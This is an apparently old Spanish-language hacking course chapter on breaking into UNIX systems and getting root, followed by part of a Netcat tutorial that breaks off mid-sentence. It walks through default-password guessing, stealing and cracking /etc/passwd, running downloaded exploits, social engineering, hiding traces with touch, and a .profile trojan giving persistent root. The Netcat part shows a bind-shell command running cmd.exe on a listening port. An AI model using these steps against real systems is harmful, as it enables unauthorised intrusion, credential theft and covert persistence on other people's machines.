[::...........................o( hACK )o............................::]

1. Curso de hack en LiNUX [4/6]

Bienvenidos a este curso a continuacion veremos las unidades:

 •Capítulo 1 - El arte del hacking 
 •Capítulo 2 - Manejando Linux. Entendiendo UNIX. 
 •Capítulo 3 - Breve análisis de los sistemas UNIX. 
 •Capítulo 4 - Entrar en un sistema y enROOTarse. 
 •Capítulo 5 - Ocultarse en un sistema. Seguir hackeando en otros sistemas. 
 •Capítulo 6 - Apaga y vámonos. 

***************************
Capítulo 4
Entrar en un sistema y "enrootarse" 
***************************

En esta unidad aprenderéis:
•Cómo recoger información del sistema al que queremos entrar 
•Técnicas para entrar sin tener una cuenta en el sistema 
•Cómo conseguir root dentro del sistema
•Qué hacer una vez se es root en el sistema 
•Cómo asegurar el futuro acceso al sistema una vez se es root

Bien, estamos ante la lección clave de este curso. Para entenderla, es esencial que hayas leido las lecciones anteriores, especialmente la 1 y la 2. 

Entrar en un sistema.

Esta es la acción principal y primordial para hackear. 

La acción de entrar en un sistema se puede dividir en dos fases :
•Recogida de información 
•Incursión en el sistema: 
o bien 
•A través de una cuenta shell 
•A través de otros métodos 

Pero también tenemos que saber que la entrada en un sistema puede ser, según el nivel de privilegio:

a.Directamente como root 
b.Como usuario normal 
c.como usuario anónimo (pero esta última queda descartada ya que como usuario anónimo no podemos hacer prácticamente nada.)

Así pues, antes de entrar en un sistema (aunque ya tengamos una cuenta shell), tenemos que pasar por la etapa de recogida de información.

1 - Recogida de información

La información que debemos saber de cualquier sistema la vamos a dividir en:
1.Información primordial 
2.Información extendida 
3.Información complementaria

La información primordial la tenemos que saber sea como sea, si no, ya nos podemos olvidar del sistema y buscarnos otro. La información extendida nos será de utilidad más adelante, y la complementaria... bueno, siempre va bien tenerla.

Información primordial: cuál es y cómo se consigue

La información primordial de cualquier sistema es qué Host/IP tiene, así como la versión de UNIX que usa. Si tenemos el host y queremos saber la IP, basta con teclear:

# nslookup <host>

Una vez sabemos el Host/IP de un sistema, tenemos que hacer un telnet a éste y observar qué versión de UNIX usa. El nombre del sistema nos basta para la información primordial (si es SunOS, si es Solaris, si es Linux, etc...).
# telnet <host> 
SunOS v3.25 
login:

Información extendida: cuál es, para qué usarla y cómo se consigue

Al hacer el telnet, no estaría mal que apareciese qué versión (sea el UNIX que sea) está usando. Es un dato que puede ayudarnos a elegir exploits para usarlos más adelante.

Otro dato que nos puede ayudar (y mucho) es la versión de Sendmail que usa. Esto lo conseguimos haciendo un telnet al puerto 25 del host. 

Nota: si el sistema que queremos hackear no permite hacer un telnet al puerto 25, deberemos descartar cualquier ataque vía Sendmail.

Para hacer un telnet al puerto 25 del host, escribimos simplemente esto:
# telnet <host> 25
Y nos aparecerá una línea con la versión del Sendmail.

Otra información extendida importante es saber detectar si el host tiene alguna actividad NFS. NFS (Network File System) es un sistema por el cual un ordenador puede compartir directorios con otros ordenadores, de manera que estos pueden manejar dichos directorios como si fuesen suyos. En muchos sistemas UNIX, el NFS está mal configurado, lo que supone un fallo de seguridad. Para saber si este sistema recibe directorios NFS, y si es que sí, cuáles son, escribiremos:

# showmount -e <host>

Podríamos considerar importante más información, pero con esta ya tenemos de momento suficiente.

Información complementaria

Siempre va bien saber, por ejemplo, qué tipo de sistema es (si es gubernamental, si es una universidad...), en qué sitio geográfico está situado, cuánto tiempo lleva on-line, qué servicios ofrece, y un largo etcétera.

2 - Incursión en el sistema

Bien, ahora que ya tenemos suficiente información vamos a tratar algunos de los métodos que se suelen usar para entrar en un sistema (los más fáciles, por supuesto).

Si ya tenemos una cuenta shell, nos basta con entrar vía telnet, poner el login y el password y ya estamos dentro. Si este es el caso, deberemos pasar a ver cómo podemos obtener root.

Pero si estamos en nuestro ordenador y no tenemos ni siquiera un login, vamos, que no sabemos qué hacer para poder entrar, antes que nada probaremos los métodos que sólo funcionan de vez en cuando, métodos que pueden parecer anti-elitistas, pero que muchas veces nos ahorran esfuerzo mental si, de casualidad, funcionan, claro está.

Un ejemplo puede ser un rlogin por el morro. Por increíble que parezca, mi primera incursión en un sistema fue gracias a esta táctica. Simplemente escribimos:

# rlogin <host>

Y hay una probabilidad entre 100 de que entremos. Pero lo bueno es que entramos directamente como root, que fue lo que a mi me sucedió. Lo que ocurre es que, al no especificar con qué nombre (login) queremos entrar en el sistema, el comando entiende que queremos entrar como root, y como no hemos puesto password, entiende que el password es simplemente, ENTER (o sea, nada). En otras palabras, que hemos entrado con la cuenta de root sin asignar password, el root no tiene aun un password asignado, cosa que es prácticamente imposible (para qué negarlo) ¡ Pero nunca está de más probarlo !

Y otra táctica de este tipo consiste en hacer lo mismo, pero usando las "default counts", que son las cuentas que vienen por defecto en cualquier sistema UNIX, y, a no ser que el root les cambie el password o las desactive, se pueden usar. Esto es bueno probarlo porque algunas veces el root solo actualiza las cuentas que usa y las otras las deja activadas. Las default counts, en sistemas UNIX son:

Login / Password
admin - admin 
sysadmin - sysadmin o admin 
unix - unix 
uucp - uucp 
rje - rje 
guest - guest 
demo - demo 
daemon - daemon 
sysbin - sysbin 
bin - bin 

Las cuentas bin son muy interesantes ya que permiten la manipulación de muchos ficheros importantes como el fichero passwd.

adm - adm 
nuucp - nuucp 
lp - lp 

Si con éstas no funciona, entonces tenemos que pensar un poco más. Vamos a ver, si el sitio al que nos conectamos se llama por ejemplo "Daddy's INC", no estaría de más probar a entrar como daddys, o daddy. 

Algunos sistemas UNIX tienen una cuenta llamada test abierta, sin password, o con el mismo login y password (test/test).

En unos pocos sistemas UNIX, podemos ejecutar algunos comandos en el prompt de login. Estos pueden ser básicamente tres:

who
rwho
finger

Con lo que podemos saber si hay alguien dentro del sistema. Y, si hay alguien, ya tenemos el login de un usuario. Imaginemos que hay un tal "pepe" conectado. Probablemente, será de esos que prefiere conectar rápido al sistema y no le ha pasado nunca por la cabeza que algún hacker pueda usar su cuenta. Así que no estaría de más intentar entrar como pepe y poner como password pepe, pepe1, pp, o lo que se nos pase por la cabeza...

Bueno, como seguramente no hemos entrado en el sistema, ya nos podemos quitar las legañas y pasar a hacer algo más serio. Si seguimos fuera del sistema, tenemos varias opciones:

•Explotar el Sendmail 
•Explotar el NFS mediante un IP Spoofing

Lo primero, consiste en usar el sistema de Mail del ordenador para obtener privilegios de root. Esto se hace aprovechando los fallos que presenta según la versión que use (ver información extendida). Así que a partir de ahora ya podemos empezar a usar exploits para hacer nuestras tareas más fáciles. Muchos no sabréis de lo que estoy hablando. Así que vamos a explicar lo que es un exploit.

Un exploit no es más que un programa que aprovecha los bugs de un sistema UNIX determinado. Hay, por supuesto, muchos exploits, para cada tipo de sistema, y diariamente van saliendo nuevos según los sistemas se actualizan y se van encontrando nuevos fallos. Los buenos hackers saben programar sus propios exploits, pero de momento vamos a coger los que ya están hechos. Una dirección donde podemos encontrar muchos es: www.rootshell.com. Los exploits están programados en C o en shell. Y, dentro de la programación en shell podemos encontrar diferentes tipos, según el tipo de shell en que se base (BASH, PERL...). Una vez tenemos el exploit que queremos usar, debemos editarlo, leer las instrucciones que contenga (muchos contienen lineas de texto haciendo referencia a las maneras que hay de usarlo, cómo hay que usarlo para que funcione de una manera u otra, etc) y salvar sólo la parte ejecutable (ya sea en shell o en C). Si está en C tendremos que compilar el exploit. Si está en shell, basta con darle permiso de ejecución y ya está listo para usar. Poco a poco os iré hablando de las diferentes maneras de usar los exploits.

Ahora que ya sabemos lo que es un exploit, podemos ir a cualquier site y bajarnos todos los que haya referentes a la versión de Sendmail que usa este sistema, compilarlos (si necesitan ser compilados), y usarlos. 

Realmente, el sistema de Mail de UNIX es muy útil para hacer fake mails, una vez dentro del sistema. Podemos hacernos pasar por cualquier dirección de correo existente. 

Es importante la organización de los exploits en el disco duro, la mejor manera es clasificarlos según: qué tipo de exploit son y a qué sistema hacen referencia. 

Bueno, los exploits locales son una buena manera de entrar directamente, pero no siempre funcionan, sobretodo porque los mismos exploits suelen tener bugs y tenemos que saber modificarlos, pero por esto de momento no os preocupeis. Hay, por supuesto, técnicas más avanzadas para entrar en sistemas. Una de ellas es el IP Spoofing.

El IP Spoofing nos permite cambiar nuestra IP. Vale, pero ¿ Qué ganamos con eso ? Bien, supongamos que el sistema al que queremos entrar está en una subred, y, por lo tanto, se comunica con sistemas trusteds, sistemas que son "colegas". ¿ Qué quiere decir que son colegas ? Pues que están comunicados entre sí y que por lo tanto tienen ciertos privilegios (tienen acceso a directorios compartidos vía NFS). Los programas de IP Spoofing lo que hacen es (de manera simplificada), intentar comunicar con un sistema trusted (colega del sistema al que queremos entrar), hacer que no responda y en ese intervalo de tiempo alterar nuestra IP para hacernos pasar por ese sistema, de manera que ya tenemos ciertos privilegios en el sistema en el que queremos entrar. 

Lo primero que tienes que hacer para poner en práctica esta táctica es bajarte un buen programa de IP Spoofing. Mejor bájate varios por si alguno no funciona. Ahora tienes que saber cuáles son los sistemas trusteds del sistema al que quieres entrar. En otras palabras, qué estructura NFS tiene. Para esto escribe lo siguiente:

# showmount -e <host>

Por otra parte, esto ya lo tendrías que haber hecho al recopilar la información del sistema. 

Y, con estos datos, ya puedes ejecutar el programa de IP Spoofing, que seguramente lo hará todo él solito. No olvides compilarlo (si está en C) y quitar las instrucciones.

En teoría con todas estas técnicas puedes pasarte un buen rato intentando entrar en un sistema. He dejado muchas técnicas por explicar y las que he descrito las he descrito muy por encima, porque considero que un hacker novicio ha de empezar siempre teniendo shells. Es decir, que ya conozcas de antemano alguna cuenta en ese sistema, eso facilita muchísimo las cosas. La única manera de conseguir una sino puedes ni siquiera entrar de forma anónima en un sistema es utilizar la ingeniería social. Si conoces el lugar físico en el que está ubicado el sistema, tienes que relacionarte con la gente que accede a él, robar papelillos o cogerlos de la papelera, espiar, hacer lo que sea hasta conseguir una cuenta en el sistema. El IRC puede ser un buen medio, pero también tienes que saber pedir las cosas. Internet, en definitiva, es un buen medio. Alguna que otra página encontrarás con shells. El fake mail puede ser también útil, hacerte pasar por alguna dirección importante de un proveedor de internet y enviar un mail a un usuario de ese proveedor para de alguna manera averiguar su login y password, aunque para eso tienes que estar antes en un sistema UNIX, y no todos los sistemas UNIX permiten hacer fake mails, o sea que esta técnica queda descartada. Pero si buscas información al respecto no te estará de más.

Conseguir ROOT una vez dentro del sistema

Bien, si hemos conseguido finalmente entrar en el sistema con shell de usuario ordinario, tenemos muchas cosas que hacer. Lo primero que querremos hacer es, por supuesto, ver qué posibilidades nos ofrece nuestra cuenta. 

1 - Hacemos un listado de nuestro directorio de inicio
2 - Miramos qué programas colectivos podemos ejecutar
3 - Echamos un vistazo al archivo .profile

Nuestro directorio de inicio, dependiendo de en qué tipo de ordenador estemos estará generalmente ocupado por programas en C o documentos relacionados con carreras universitarias (si estamos en una universidad). Conviene no modificar ninguno de estos elementos, porque el usuario real de esta shell se daría cuenta de que la fecha ha cambiado. Y aún peor si se nos ocurre borrarlos. Simplemente les echamos un vistazo (si nos interesa, claro).

Ahora ejecutamos el comando help para ver qué programas colectivos podemos ejecutar (editores de texto, programas de mail, etc...). Y por último, no nos irá mal saber qué hay en nuestro .profile, y, si tenemos que modificarlo, no tenemos que olvidar volver a poner la fecha original (con el comando touch). 

Después tenemos que intentar movernos del directorio en el que estamos, a ver si podemos explorar otras áreas del sistema. Si no podemos, no hay que desesperarse. Quizás sí podemos leer ficheros del sistema aunque no podamos movernos del directorio, por eso tenemos que probar a hacer esto:
$ cat /etc/passwd 
Si estamos de suerte y sale algo, pues grabamos la información en un fichero nuestro.

$ cat /etc/passwd >> passwd
Y ya tenemos el archivo passwd.

Ahora vamos a mirar más archivos importantes
$ cat /etc/hosts

Este archivo te mostrará todos los sistemas que están en la subred del sistema en el que estás. Esto te puede ser útil porque, si te cierran la cuenta aquí, probablemente puedas intentar entrar en algún sistema de la misma subred con la misma cuenta. Si te interesa, salva esta información en otro archivo.

Ahora vamos a ver qué podemos hacer con el archivo passwd.

Como ya sabeis, este fichero contiene las cuentas del sistema. También sabeis qué elementos contiene. Cuando dije que contenía el password del usuario dije que nunca aparecía tal y como era. El password puede aparecer de varias formas:

Shadow

Cuando el password está shadow, en realidad se encuentra en otro archivo que se llama shadow, que no es visible más que por el root. En este caso no podemos hacer nada. Aparece shadow si aparece como un asterisco o una x:

Anastasio:*:1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh
Anastasio:x:1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh 

Encriptado

El password está encriptado si está formado por una combinación muy extraña de carácteres. Esta combinación no es el password en sí, sino el password encriptado. En este caso sí podemos hacer algo, es más, tenemos muchas posibilidades de descubrir de qué password se trata. Lo que tenemos que hacer es bajarnos un buen desencriptador de passwords. Yo suelo usar el John The Ripper, es un desencriptador muy bueno. Los desencriptadores suelen funcionar intentando asociar una serie de palabras agrupadas por temas a los passwords encriptados. Estas agrupaciones se llaman diccionarios y también se pueden bajar. Aunque, si queremos desencriptar bien las contraseñas hay algunos desencriptadores que hacen una desencriptación completa, sin usar ningún diccionario, prueban todas las combinaciones posibles. Lo malo que tiene este sistema es que el proceso de desencriptación puede tardar muchas horas, pero vale la pena sobretodo si tienes un archivo de passwords con una cuenta root encriptada. 

Los desencriptadores, por supuesto, funcionan off-line. Así que lo que tienes que hacer si has conseguido el archivo de contraseñas encriptado es desconectar y probar a desencriptarlo.

Una cuenta encriptada tiene este aspecto:

Anastasio:Mo54Wasl6H:1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh

Normal

Si encuentras alguna cuenta así, te mereces un premio, porque prácticamente es imposible de encontrar. Simplemente la contraseña se muestra tal cual es.

Anastasio:juana:1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh

Sin password

En este caso no hay password, para acceder con esta cuenta simplemente hacemos telnet, ponemos el login y ya estamos dentro.

Anastasio::1500:10:Anastasio Fernandez:/usr/anastasio:/bin/sh

Nota: Hay que tener en cuenta que si nos encontramos un espacio en blanco, un asterisco o un signo de admiración delante del password, la cuenta está inhabilitada temporalmente, eso significa que el acceso del usuario al sistema ha sido restringuido por el admin (¡ o por un hacker !).

Bueno, crackear el archivo password es una posibilidad a tener en cuenta para conseguir acceso root, averiguando cuál es la contraseña que usa el root. En el hipotético caso de que lleguemos a saber cuál es la contraseña del root, lo que tenemos que hacer es, ante todo, no cambiarla (una vez estemos dentro como root). Después, pasar a mirar la parte de esta unidad referente a qué hacer cuando se es root.

Si lo del archivo passwd no ha resultado, vamos a pasar a intentar buscar defectos en el sistema en el que estamos. Ya podemos ir preparando los exploits que necesitemos. Ahora bien, ¿ Con qué criterio hay que elegirlos ? Los exploits que ejecutes en el sistema tienen que cumplir siempre estas condiciones:

1 - La más trivial, que hagan referencia al sistema UNIX en el que estás. No ejecutes un exploit para HP-UX si estás en un Solaris. 
2 - Que hagan referencia a la versión exacta del sistema UNIX en el que estás. De una versión a otra se corrigen los errores, por lo tanto un exploit para AIX 3.25 no funcionará en un AIX 4.x
3 - Que sean lo más nuevos posibles. Los exploits aparecen a medida que se van encontrando los errores en los sistemas. Por lo tanto, hay más posibilidades que el admin del sistema no haya tenido tiempo a parchear el bug al que haga referencia el exploit. En ciertos sites como rootshell.com aparecen exploits nuevos cada mes. 
4 - Que hagan lo que necesitas que hagan. Leete qué es lo que hacen, inicialmente te interesa ganar acceso root, pues coge solo los que hagan esto. No te interesará, por ejemplo, hacer petar el sistema, ni colocar un sniffer. También habrán exploits que para ejecutarlos necesitarás ser root en el sistema ¡ Tampoco te interesan !

Nota: En el capítulo 3 hay algunos de los bugs más conocidos de cada sistema UNIX. Para poder aprovecharlos, busca los exploits que hagan referencia a esos bugs.

No todos los exploits son iguales, eso es algo que ya hemos comentado antes. Antes he mencionado la palabra exploit local. Llegados a este punto, tienes que entender la diferencia entre exploit local y exploit remoto:

- Exploit local: tanto si está en C como en Shell, tiene que ejecutarse sin estar conectado a ningún sistema (¡ pero sí a Internet !).
- Exploit remoto: Si está en C, hay que subir el código fuente al sistema y compilarlo DENTRO del sistema. Una vez compilado se ejecuta. Si está en Shell simplemente hay que subirlo al sistema y ejecutarlo dentro del sistema.

Ahora vamos a ver cómo podemos poner a punto nuestro exploit. Debes seguir este proceso:

1 - Descomprime el exploit si está en formato .tgz. Esto lo puedes hacer con:
# tar xfvz <nombre del archivo>.tgz

2 - Edita el exploit.
Te encontrarás con que algunos exploits no son más que un archivo de texto explicando cómo aprovechar un bug. Si este es el caso, léete cuidadosamente el archivo y apunta en un papel lo que te diga que tienes que hacer (normalmente te dirá que usando un comando de tal manera puedes conseguir root o leer ciertos archivos...). Otros exploits serán shellscripts, y al principio habrán las instrucciones. Tienes que leértelas bien, y guardar en otro archivo solo el shellscript (quitando las líneas de texto que sobren). Para poder ejecutarlo tienes que darle permiso de ejecución. Otros serán programas en C, en este caso si hay instrucciones, estas son ignoradas al compilar, así que no hay problema. Ya sabes que si es un exploit remoto tienes que subir el código al sistema (esto puedes hacerlo a través de una sesión FTP, usando el mismo login y el mismo password que para la sesión telnet), y una vez dentro, compilarlo (haciendo una sesión telnet) usando esta línea:

$ gcc <archivo>.c

Y el resultado de esta operación será un archivo llamado a.out, que tienes que renombrar a tu gusto ( o ejecutar directamente con ese nombre ).

Hay exploits que son una mezcla entre C y shellscript, es decir, que una parte está en C y otra en shell. En este caso tienes que separar las dos partes en dos archivos distintos y hacer lo que ya sabes.

3 - La última parte es ejecutarlos, esperando que funcionen. Suelen funcionar si el sistema no está parcheado al máximo. 

Experimenta por ti mismo todo lo referente a exploits, ahora que ya sabes cómo utilizarlos. 

Pero recuerda, si los exploits que has seleccionado no funcionan, no hagas el tonto subiendo otros que sabes que no van a funcionar. Debes saber que todo lo que haces en un sistema UNIX queda registrado en varios logs (algo que veremos en la próxima lección), así que si en una sesión no has conseguido hacerte root, al cabo de un día tu cuenta estará cerrada porque, probablemente, el admin se habrá dado cuenta de que has estado haciendo cosas "sospechosas". Por si acaso, si te tienes que ir, no olvides dejar el directorio de inicio del usuario tal y como estaba. Si te dejas tus exploits ahí, te puedo asegurar que te van a cerrar la cuenta pase lo que pase (porque el usuario se dará cuenta y lo comunicará al admin). También he comentado que, si has modificado algún archivo ya existente, tienes que volver a ponerle la fecha que ya tenía con el comando touch. 

Pero si te han cerrado la cuenta, lo que tienes que hacer es buscarte más shells y seguir practicando.

Si has conseguido nivel root, vamos a pasar a explicar qué es lo que tienes que hacer.

¿ Qué hacer una vez se es ROOT ?

Una vez eres root, el sistema es tuyo. No hay ningún tipo de restricción, puedes pasearte por el sistema como si fuese tuyo. Es muy importante, cuando se es root, asegurarse de que nos vamos a ir sin dejar ninguna huella. Pero esto lo voy a explicar en la próxima lección. Así mismo, si queremos asegurarnos nuestra continuidad como hacker en ese sistema, tenemos que ingeniarnos algún método para que podamos entrar y salir siendo siempre root. Una manera sería hacer el mismo proceso que hemos hecho para conseguir root. Pero, ¿ Y si es un proceso demasiado largo ? ¿ Y si tenemos root y no sabemos ni cómo lo hemos conseguido ? 

Podríamos crear una cuenta con acceso root, pero el admin del sistema lo acabaría viendo. Lo que podemos hacer es usar el .profile del root para asegurarnos el futuro acceso mediante un caballo de troya. 

Muchos os preguntareis ¿ Qué es un caballo de troya ? Bueno, un caballo de troya no es más que un proceso oculto. Vamos a verlo mediante un ejemplo muy sencillo:

Caballo de troya 1

Vamos a meter un caballo de troya en el archivo .profile de un usuario normal. Nos movemos a su directorio de inicio. 

Lo primero que hacemos es una copia del archivo original a un archivo temporal oculto:
# cp .profile .temp

Ahora, editamos el archivo .profile y añadimos estas líneas al final:
echo " Bienvenido, Anastasio Fernández "
echo " Que tengas un buen día. "
echo " ¿ A que no sabes cómo te están llegando estas líneas ? " 

Y la línea más importante que tenemos que añadir es:

mv .temp .profile

¿Qué hemos hecho con esto?. Acabamos de ocultar un proceso, en este caso un mensage de bienvenida. El archivo original .profile estaba guardado en en uno temporal (.temp). De manera que cuando Anastasio entra en el sistema, su .profile (que es el que hemos modificado) se encarga de ocultarse moviendo el contenido del archivo temporal otra vez al archivo profile, de manera que cuando Anastasio mire en su .profile no verá nada anormal. Excepto la fecha de modificación, pero eso lo podemos arreglar añadiendo un comando touch al final del caballo de troya. 

Naturalmente no es muy recomendable hacer esto, ya que a un usuario normal no le haría mucha gracia y comunicaría al admin que ha entrado un hacker en el sistema.

Ahora que ya sabemos qué es un caballo de troya, vamos a hacer el caso que nos ocupa:

Caballo de troya 2 

Vamos a hacer que un usuario normal consiga root instantáneamente al entrar en el sistema. Para aquellos que pilleis las cosas rápido, se trata de:
•Hacer una copia del .profile del root en el directorio de inicio de un usuario normal 
•Convertir esta copia a ejecutable 
•Hacer una copia del .profile del usuario normal a un archivo temporal oculto 
•Modificar el .profile para que el usuario, cuando entre: 
•Ejecute el .profile de root 
•Borre el .profile de root 
•Mueva el contenido de la copia de su .profile (temp) a su .profile real

Si habéis seguido las lecciones hasta aquí no tendréis problema en hacer este caballo de troya.

Pero para los más despistados, aquí está el proceso:

# cd /root
# cp .profile /usr/anastasio/.runme
# cd /usr/anastasio
# chmod a+x .runme
# cp .profile .temp
# ed .profile

Y añadimos:

.runme
rm .runme
mv .temp .profile

Así, cada vez que entremos con la cuenta de Anastasio, seremos root. Naturalmente también puede ser que Anastasio Fernández, el usuario real de la cuenta, entre y vea que es root. Por eso recomiendo hacer esto: salir del sistema a hacer lo que tengamos que hacer, y al cabo de un rato volver a entrar (seremos root) y no volver a hacer este caballo de troya. Si en este intervalo de tiempo ha entrado Anastasio Fernández, ya no hay nada que hacer. Pero siempre podemos pensar que hemos hecho feliz a alguien.

Bueno, siendo root se pueden hacer infinidad de cosas. Si quieres, disfruta de tu limitado acceso root (ahora que no sabes cómo borrar tus huellas) curioseando por el sistema. No te recomiendo que borres nada. Simplemente mira a ver qué hay. Y, ahora que sabes hacer caballos de troya, puedes divertirte haciéndolos en los .profile's de los usuarios normales. Por ejemplo, puedes poner un mensage personal si conoces a alguien del sistema. 

¡ Sé paciente y dentro de poco descubrirás cómo borrar tus huellas en los sistemas en los que te enrootes ! Además, aprenderás a poner Sniffers. ¡ Todo esto y mucho más en la próxima lección ! ¡ Nos vemos !

----------------;))
2. Netcat

 Netcat  es un  peque¤o programa creado para uso de los Administradores
de redes (y por supuesto para los Hackers) :), este proggie fue creado
originalmente  por  Hobbit  y  porteado a Win95 y NT por Weld Pond  de
L0pht, tiene  mas de  un a¤o desde que fu‚ Liberado y muy poco  se  ha
escrito sobre este Programita; Principalmente porque la estructura  de
sus  comandos  es  poco familiar para el usuario medio.  Netcat  tiene
infinidad  de  funciones, aunque se deja que sea el usuario quien  las
averige :P, y  en el  archivo de  ayuda  ponen algunos ejemplitos muy 
elementales solamente...
 La especialidad de Netcat es el Protocolo TCP/IP, y le da a la m quina
de windows,  cierto  poder  sobre  este protocolo que solo ten¡a UNIX,
trabaja  con  l¡neas de  comandos desde  MS-DOS (o desde  el Shell  de
Linux), y seg£n parece, puede hacer casi cualquier cosa sobre  TCP/IP.
El comando principal es nc con su respectiva variable u opci¢n al  m s
puro estilo Unix.

 Cabe  destacar que la informaci¢n sobre Netcat y sus usos  espec¡ficos
es  bastante  limitada; aunque  Hobbit  en  su documento aclara muchas
cosas,  cita  algunos  ejemplos  y dice que NetCat puede ser utilizado
para mas de 1001 vainas...

  Netcat puede ser encontrado en: http://www.l0pht.com/~weld/netcat

	Netcat en WinX
	==============
	
  Este  es el  resultado del comando de ayuda de netcat en  una  m quina
  windows

 c:>nc -h

connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [options] [hostname] [port]
options:
        -d              detach from console, stealth mode

        -e prog         inbound program to exec [dangerous!!]
        -g gateway      source-routing hop point[s], up to 8
        -G num          source-routing pointer: 4, 8, 12, ...
        -h              this cruft
        -i secs         delay interval for lines sent, ports scanned
        -l              listen mode, for inbound connects
        -L              listen harder, re-listen on socket close
        -n              numeric-only IP addresses, no DNS
        -o file         hex dump of traffic
        -p port         local port number
        -r              randomize local and remote ports
        -s addr         local source address
        -t              answer TELNET negotiation
        -u              UDP mode
        -v              verbose [use twice to be more verbose]
        -w secs         timeout for connects and final net reads
        -z              zero-I/O mode [used for scanning]
port numbers can be individual or ranges: m-n [inclusive]

  Bien;  un  an lisis  r pido  de estas variables nos  da  una idea  del
  potencial  de  este peque¤o programa y las infinitas posibilidades que
  nos ofrece ‚l  poder  manejar  conexiones de  una manera  tan b sica y
  sencilla:

<------ Opciones de Netcat --------->

-d  (Modo Stealth o encubierto) 

  Esta opci¢n desvincula al Programa de la consola, haci‚ndolo  trabajar
  en el BackGround.

-e<prog>  (Ejecuta un programa cuando se conecta) 

  Puede ser utilizado para ejecutar incluso un Shell tanto en WinX  como
  en *NIX.

-l  (Escuchando conexiones) 

  Deja a un puerto abierto en espera de una conexi¢n

-L  (lo mismo que anteriormente pero sigue escuchando a£n cuando la
  conexi¢n es cerrada)

  Esta opci¢n es incluida en la versi¢n de Weld Pond de L0pth, y es  muy
  £til para seguir escuchando en el puerto, a diferencia de -l  (que  la
  conexi¢n cerrada termina con el proceso de nc) esta  opci¢n -L permite
  seguir   escuchando  en  el  mismo  puerto  (la  rutina  de  nc -l  es
  reincidida).

-n   (Direcci¢n num‚rica especifica; no hace un DNS Lookup) Netcat tiene
  la facultad de resolver nombres de dominio mediante un DNS Lookup, con
  esta  opci¢n  le  especificamos  que  no  lo  haga,  y  use  solamente
  direcciones IP.

-o<logfile>  (obtiene  un archivo log en Hex de la acci¢n) Genera un Log
  de las actividades de netcat en c¢digo Hexadecimal.

-p<puerto> (Puerto para pegarse) Algunas veces debes  especificarle  con
  esta opci¢n el puerto a realizar una acci¢n.

-s<IP addr>  (pegarse a un IP especifico) Netcat  puede  utilizar IP  de
  una red como fuente local.

-t   (Funciona como un  peque¤o  demonio  telnet)  Con  esta  opci¢n  le
  especificas a netcat que debe realizar negociaciones telnet.

-u  specify UDP (Utilizar Protocolo UDP)  Con  esta opci¢n  le  dices  a
  netcat que trabaje con protocolo UDP en vez de TCP.

-v   (modo verbose, mas informaci¢n, se le puede a¤adir otra -v para mas
  info todav¡a)  Bastante  £til y necesario,  sobre  todo  para estudiar
  demonios en profundidad y observar todos los detalles en un Sniffing.

-w <segundos> (Especifica  un  tiempo  para terminar) Con esta opci¢n le
  especificas un tiempo determinado para realizar conexiones.

-r (Genera un Patr¢n Ramdom de puertos locales o remotos) Muy £til  para
evitar patrones l¢gicos de Scanning.

-g <gateway> (especificar Gateways) Una de las opciones m s interesantes
  de netcat, permite utilizar Routers como "puentes" de conexi¢n.

-G <numero> (Especificar puntos de  Routing), Con  esta  opci¢n  podemos
  crear una cadena aleatoria de hosts para crear una ruta  perdida  para
  tus paquetes (Spoofing).
 
-i <segundos>  Especifica  un  intervalo   de  segundos   entre  puertos
  Scaneados.

<------------- Fin de las opciones comentadas ------> 

Netcat en Linux
===============

 Netcat en una plataforma como Linux se convierte en una  utilidad  muy
potente,   pudiendo   ser  utilizado  en  conjunto  con  lenguajes  de
programaci¢n como Perl y C , o bien  desde la propia L¡nea de comandos
del poderoso Shell de Linux mediante Shell Scripts.

 Cabe destacar que distribuciones como RedHat Linux trae junto  con sus
paquetes  de  instalaci¢n  una  versi¢n  limitada  de  netcat;  lo m s
recomendable es bajar de la red la versi¢n  full de netcat para  Linux
(Importante: La versi¢n de netcat para linux viene a prueba de lamers,
por lo cual debemos compilar a netcat con unos flags  especiales  para
poder  obtener  las opciones -t y -e (Telnet y Gaping Security Hole)).
Bajas el .tar de  netcat y  lo  desempaquetas  en el directorio  de tu
preferencia, te ubicas dentro del directorio  de netcat y lo  compilas
con Make utilizando las siguientes Flags:

[root@DarkStar] #make linux DFLAGS=" -DTELNET -DGAPING_SECURITY_HOLE"

 Copias el binario (nc) al directorio /usr/bin , de esta manera  podr s
usar netcat directamente  llam ndolo  de  cualquier  parte  del Shell,
adem s de que podr s usar los scripts que hagas (o consigas en la red)
sin  problemas;  netcat  trae  unos  scripts  muy  interesantes y bien
comentados para que los estudies y comprendas mejor su  implementaci¢n
en scripts, los scripts est n en el directorio donde  desempaquetastes
netcat en /scripts , los  corres  como siempre: ./probe  (o  el script
que quieras).


Utilizando Netcat
=================

 Para  ilustrar  mejor  como trabajamos con este programa, lo mejor  es
observar  ejemplos  pr cticos  y  analizar  su  estructura  para poder
comprender  mejor como funciona y  as¡ poder  crear  nuestras  propias
aplicaciones.

 Algunas de las cosas que podemos hacer con NetCat son:

 Obtener un Shell r pidamente en una m quina remota usando la opci¢n -l
(Listen) conjuntamente con la opci¢n -e (ejecutar), cuando el proggie
corre  con estas variables y la conexi¢n es realizada, NetCat  ejecuta
el programa elegido y se conecta a stdin y stdout del programa  en  la
conexi¢n a la red.

nc -l -p 23 xxx.xxx.xxx.xx 23 -t -e cmd.exe

 Este comando dejar  a NetCat escuchando el Puerto 23 (telnet),  cuando
es  conectado  a  trav‚s  del cliente, ejecutar  un Shell (cmd.exe) la
opci¢n -t le  dice  a  NetCat  que maneje cualquier negociaci¢n que el
cliente pueda esperar....

 Si esta conexi¢n  es realizada desde una m quina NT, el shell  correr 
los  permisos  del proceso que han generado a NetCat (Hmmm...) as¡ que
hay que ser muy cuidadosos :)

 La belleza de NetCat es que puede hacer  lo mismo en CUALQUIER  puerto
:) Puedes dejar a NetCat escuchando en los puertos NETBIOS, que  est n
probablemente  corriendo  en  la  mayor¡a  de las m quinas NT, de esta
manera  puedes  lograr  una conexi¢n a una m quina que est‚ utilizando
"Filtrado de Puertos"  activado  en  TCP/IP  security  Network Control
Panel, NT  no  parece  tener  ninguna  seguridad  alrededor  de cuales
puertos  los programas de usuarios son permitidos amarrar, esto quiere
decir en pocas palabras, ejecutar  comandos  y  programas  que  puedan
unirse a los Puertos NETBIOS.


 Como anteriormente se mencion¢, puedes utilizar a Netcat para estudiar
diferentes puertos, con la siguiente sintaxis:

